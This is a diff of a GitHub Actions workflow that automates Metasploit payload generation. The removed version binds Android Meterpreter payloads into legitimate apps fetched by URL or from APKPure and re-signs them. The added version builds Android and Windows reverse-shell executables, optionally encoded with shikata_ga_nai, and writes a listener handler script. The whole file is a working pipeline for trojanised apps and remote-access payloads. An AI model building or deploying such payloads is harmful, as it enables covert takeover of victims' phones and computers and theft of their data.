@@ -1,41 +1,37 @@
-name: Android Meterpreter APK (bind)
+name: Build Payload
 
 on:
   workflow_dispatch:
     inputs:
       payload:
-        description: "Payload"
+        description: "Payload to generate"
         required: true
-        default: android/meterpreter/bind_tcp
+        default: android/meterpreter/reverse_tcp
         type: choice
         options:
-          - android/meterpreter/bind_tcp
           - android/meterpreter/reverse_tcp
           - android/meterpreter/reverse_https
-      lport:
-        description: "LPORT: bind port the phone listens on (or callback port)"
-        required: false
-        default: "5555"
+          - android/meterpreter/bind_tcp
+          - windows/meterpreter/reverse_tcp
+          - windows/x64/meterpreter/reverse_tcp
+          - windows/shell/reverse_tcp
+          - windows/x64/shell_reverse_tcp
       lhost:
-        description: "LHOST (only used by reverse payloads)"
-        required: false
+        description: "LHOST (your listener IP)"
+        required: true
         default: "203.0.113.10"
-      rhost:
-        description: "Device IP for the bind handler (you connect out to the phone)"
-        required: false
-        default: "192.168.1.50"
-      template_apk:
-        description: "Path in repo to the real APK (e.g. apk/template.apk)"
-        required: false
-        default: ""
-      template_url:
-        description: "OR direct URL to a single APK (used if template_apk is empty)"
+      lport:
+        description: "LPORT (listener port / bind port)"
+        required: true
+        default: "4444"
+      encoder:
+        description: "Encoder (windows x86 only, leave empty for none)"
         required: false
         default: ""
-      apkeep_package:
-        description: "OR app id to fetch from APKPure via apkeep (e.g. com.instagram.android)"
-        required: false
-        default: ""
+        type: choice
+        options:
+          - ""
+          - x86/shikata_ga_nai
   push:
     branches: [main]
 
@@ -45,197 +41,106 @@ permissions:
 jobs:
   build:
     runs-on: ubuntu-latest
-    timeout-minutes: 40
+    timeout-minutes: 25
     env:
-      PAYLOAD: ${{ inputs.payload || 'android/meterpreter/bind_tcp' }}
+      PAYLOAD: ${{ inputs.payload || 'android/meterpreter/reverse_tcp' }}
       LHOST: ${{ inputs.lhost || '203.0.113.10' }}
-      LPORT: ${{ inputs.lport || '5555' }}
-      RHOST: ${{ inputs.rhost || '192.168.1.50' }}
+      LPORT: ${{ inputs.lport || '4444' }}
+      ENCODER: ${{ inputs.encoder || '' }}
 
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-        with:
-          lfs: true   # pulls APKs tracked with Git LFS
-
-      - name: Setup Java 17
+      - name: Install Java
         uses: actions/setup-java@v4
         with:
           distribution: temurin
           java-version: '17'
 
-      # ---------- apktool + signers + apkeep ----------
-      - name: Install apktool and APK tooling
-        run: |
-          set -euo pipefail
-          sudo apt-get update
-          sudo apt-get install -y curl jq unzip zip
-
-          # remove any old apt apktool
-          sudo apt-get remove -y apktool || true
-          sudo rm -f /usr/bin/apktool /usr/local/bin/apktool /usr/local/lib/apktool.jar
-
-          # always install the LATEST jar from GitHub releases
-          URL=$(curl -fsSL https://api.github.com/repos/iBotPeaches/Apktool/releases/latest \
-                | jq -r '.assets[].browser_download_url' | grep -E 'apktool_.*\.jar$' | head -n1)
-          echo "Installing: $URL"
-          sudo curl -fsSL "$URL" -o /usr/local/lib/apktool.jar
-          printf '#!/bin/sh\nexec java -jar /usr/local/lib/apktool.jar "$@"\n' | sudo tee /usr/local/bin/apktool >/dev/null
-          sudo chmod +x /usr/local/bin/apktool
-
-          sudo apt-get install -y apksigner zipalign || true
-
-          # apkeep (optional)
-          curl -fsSL -o /tmp/apkeep.tar.gz \
-            https://github.com/EFForg/apkeep/releases/latest/download/apkeep-x86_64-unknown-linux-musl.tar.gz || true
-          if tar xzf /tmp/apkeep.tar.gz -C /tmp 2>/dev/null; then
-            sudo mv /tmp/apkeep-*/apkeep /usr/local/bin/apkeep 2>/dev/null || true
-            sudo chmod +x /usr/local/bin/apkeep || true
-          fi
-
-          echo "--- versions ---"
-          java -version 2>&1 | head -n1
-          apktool --version
-          for t in keytool jarsigner apksigner apkeep; do
-            printf '%-10s %s\n' "$t" "$(command -v $t || echo MISSING)"
-          done
-
-          # fail fast if it's still < 2.9.2
-          V=$(apktool --version | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')
-          echo "apktool version detected: $V"
-          python3 -c "import sys; sys.exit(0 if tuple(map(int,'$V'.split('.'))) >= (2,9,2) else 1)" \
-            || { echo "apktool too old"; exit 1; }
-            
-      # ---------- install metasploit ----------
-      - name: Install Metasploit Framework (Rapid7 omnibus)
+      - name: Install Metasploit Framework
         run: |
           curl -fsSL https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb -o msfinstall
           chmod 755 msfinstall
           sudo ./msfinstall
           echo "/opt/metasploit-framework/bin" >> "$GITHUB_PATH"
 
-      - name: Init database (optional)
-        continue-on-error: true
-        run: |
-          sudo service postgresql start || true
-          sudo -u postgres createuser -s "$USER" || true
-          sudo msfdb init || true
-
-      - name: Verify Metasploit + payload
+      - name: Verify Metasploit
         run: |
           msfconsole --version
-          msfvenom -l payloads | grep -F "$PAYLOAD" || { echo "payload $PAYLOAD not found"; exit 1; }
+          msfvenom -l payloads | grep -F "$PAYLOAD" || { echo "payload not found: $PAYLOAD"; exit 1; }
 
-      # ---------- resolve the real app ----------
-      - name: Resolve template APK (repo path > URL > apkeep)
-        env:
-          T_INPUT: ${{ inputs.template_apk }}
-          T_URL: ${{ inputs.template_url }}
-          T_PKG: ${{ inputs.apkeep_package }}
+      - name: Build payload
         run: |
           set -euo pipefail
-          mkdir -p apk out
-          T=""
+          mkdir -p out
 
-          if [ -n "${T_INPUT:-}" ] && [ -f "$T_INPUT" ]; then
-            echo "using repo file: $T_INPUT"
-            T="$T_INPUT"
-
-          elif [ -n "${T_URL:-}" ]; then
-            echo "downloading: $T_URL"
-            curl -fL --retry 3 -A "Mozilla/5.0" -o apk/template.apk "$T_URL"
-            T="apk/template.apk"
-
-          elif [ -n "${T_PKG:-}" ] && command -v apkeep >/dev/null; then
-            echo "fetching $T_PKG with apkeep"
-            apkeep -a "$T_PKG" -d apk-pure apk/ || true
-            T="$(ls -1 apk/${T_PKG}*.apk 2>/dev/null | head -n1 || true)"
-          fi
-
-          echo "TEMPLATE=$T" >> "$GITHUB_ENV"
-          echo "resolved template = '${T:-<none>}'"
-
-      - name: Validate template APK
-        run: |
-          set -euo pipefail
-          if [ -z "${TEMPLATE:-}" ]; then
-            echo "No template supplied - standalone APK only"
-            exit 0
-          fi
-          file "$TEMPLATE"
-          ls -lh "$TEMPLATE"
-          unzip -l "$TEMPLATE" | grep -q 'AndroidManifest.xml' || { echo "not an APK"; exit 1; }
-          unzip -l "$TEMPLATE" | grep -qE 'classes[0-9]*\.dex' || { echo "no classes.dex - split APK?"; exit 1; }
-          echo "--- resources.arsc / signature ---"
-          unzip -l "$TEMPLATE" | grep -E 'resources\.arsc|META-INF/.*\.(RSA|DSA|EC)$' || true
-          echo "--- decode test with apktool ---"
-          apktool d -f -o /tmp/tpl "$TEMPLATE" >/dev/null
-          echo "apktool decode OK"
-
-      # ---------- build ----------
-      - name: Build APK(s)
-        run: |
-          set -euo pipefail
-          OPTS=(LPORT="$LPORT")
           case "$PAYLOAD" in
-            *bind*) echo "bind payload: LHOST not needed" ;;
-            *)      OPTS+=(LHOST="$LHOST") ;;
+            android/*)       EXT=apk; FMT=raw ;;
+            windows/x64/*)   EXT=exe; FMT=exe ;;
+            windows/*)       EXT=exe; FMT=exe ;;
+            *)               echo "unsupported payload: $PAYLOAD"; exit 1 ;;
           esac
 
-          echo "== standalone =="
-          msfvenom -p "$PAYLOAD" "${OPTS[@]}" -f raw -o out/standalone.apk
+          NAME=$(echo "$PAYLOAD" | tr '/' '_')
+          OUT="out/${NAME}.${EXT}"
 
-          if [ -n "${TEMPLATE:-}" ]; then
-            echo "== bound into $TEMPLATE =="
-            msfvenom -p "$PAYLOAD" "${OPTS[@]}" -x "$TEMPLATE" -f raw -o out/bound.apk
-          else
-            echo "no template - skipping injection"
+          ARGS=(-p "$PAYLOAD")
+          case "$PAYLOAD" in
+            *bind*) : ;;                          # bind payload: no LHOST
+            *)      ARGS+=(LHOST="$LHOST") ;;
+          esac
+          ARGS+=(LPORT="$LPORT")
+
+          if [ -n "${ENCODER:-}" ]; then
+            if [ "$EXT" = "exe" ] && [ "$PAYLOAD" != windows/x64/* ]; then
+              ARGS+=(-e "$ENCODER" -i 5)
+            else
+              echo "encoder ignored for $PAYLOAD"
+            fi
           fi
-          ls -lh out
 
-      - name: Re-sign for Android 11+ (v1+v2)
+          echo "msfvenom ${ARGS[*]} -f $FMT -o $OUT"
+          msfvenom "${ARGS[@]}" -f "$FMT" -o "$OUT"
+
+          [ -s "$OUT" ] || { echo "empty output"; exit 1; }
+          file "$OUT"
+          ls -lh "$OUT"
+
+      - name: Re-sign APK (Android 11+ compatibility)
+        continue-on-error: true
+        if: endsWith(env.PAYLOAD, 'tcp') || endsWith(env.PAYLOAD, 'https')
         run: |
           set -euo pipefail
-          if ! command -v apksigner >/dev/null; then
-            echo "apksigner missing - msfvenom's default v1 signature kept"
-            exit 0
-          fi
+          [ -n "$(ls -A out/*.apk 2>/dev/null)" ] || exit 0
+          sudo apt-get update -qq && sudo apt-get install -y apksigner || exit 0
           keytool -genkeypair -keystore lab.jks -alias lab -keyalg RSA -keysize 2048 \
             -validity 10000 -storepass labpass -keypass labpass \
-            -dname "CN=lab, OU=pentest, O=lab, C=US"
+            -dname "CN=lab, OU=lab, O=lab, C=US" 2>/dev/null
           for f in out/*.apk; do
-            [ -e "$f" ] || continue
             case "$f" in *-signed.apk) continue ;; esac
             apksigner sign --ks lab.jks --ks-pass pass:labpass --key-pass pass:labpass \
               --v1-signing-enabled true --v2-signing-enabled true \
               --out "${f%.apk}-signed.apk" "$f"
-            echo "== verify ${f%.apk}-signed.apk =="
-            apksigner verify --verbose "${f%.apk}-signed.apk" || true
+            apksigner verify "${f%.apk}-signed.apk" || true
           done
           ls -lh out
 
-      - name: Generate handler.rc
+      - name: Write handler.rc
         run: |
           set -euo pipefail
           {
             echo "# msfconsole -r handler.rc"
             echo "use exploit/multi/handler"
             echo "set payload $PAYLOAD"
-            echo "set LHOST 0.0.0.0"
+            echo "set LHOST $LHOST"
             echo "set LPORT $LPORT"
-            case "$PAYLOAD" in
-              *bind*) echo "set RHOST $RHOST   # phone IP - you connect to it" ;;
-              *)      echo "set LHOST $LHOST" ;;
-            esac
             echo "set ExitOnSession false"
             echo "run -j"
           } > out/handler.rc
           cat out/handler.rc
 
-      - name: Upload artifacts
+      - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: android-apk-${{ github.run_number }}
+          name: ${{ inputs.payload || 'payload' }}-${{ github.run_number }}
           path: out/
           if-no-files-found: error
           retention-days: 7
@@ -243,15 +148,13 @@ jobs:
       - name: Summary
         run: |
           {
-            echo "### Build summary"
+            echo "### Payload built"
             echo ""
             echo "- payload: \`$PAYLOAD\`"
-            echo "- LPORT: \`$LPORT\`  (bind port on the phone)"
-            echo "- template: \`${TEMPLATE:-<none>}\`"
+            echo "- LHOST/LPORT: \`$LHOST:$LPORT\`"
+            echo "- encoder: \`${ENCODER:-none}\`"
             echo ""
             echo "| file | size |"
             echo "|---|---|"
-            for f in out/*.apk out/handler.rc; do
-              [ -e "$f" ] && echo "| \`$(basename "$f")\` | $(du -h "$f" | cut -f1) |"
-            done
+            for f in out/*; do [ -e "$f" ] && echo "| \`$(basename "$f")\` | $(du -h "$f" | cut -f1) |"; done
           } >> "$GITHUB_STEP_SUMMARY"
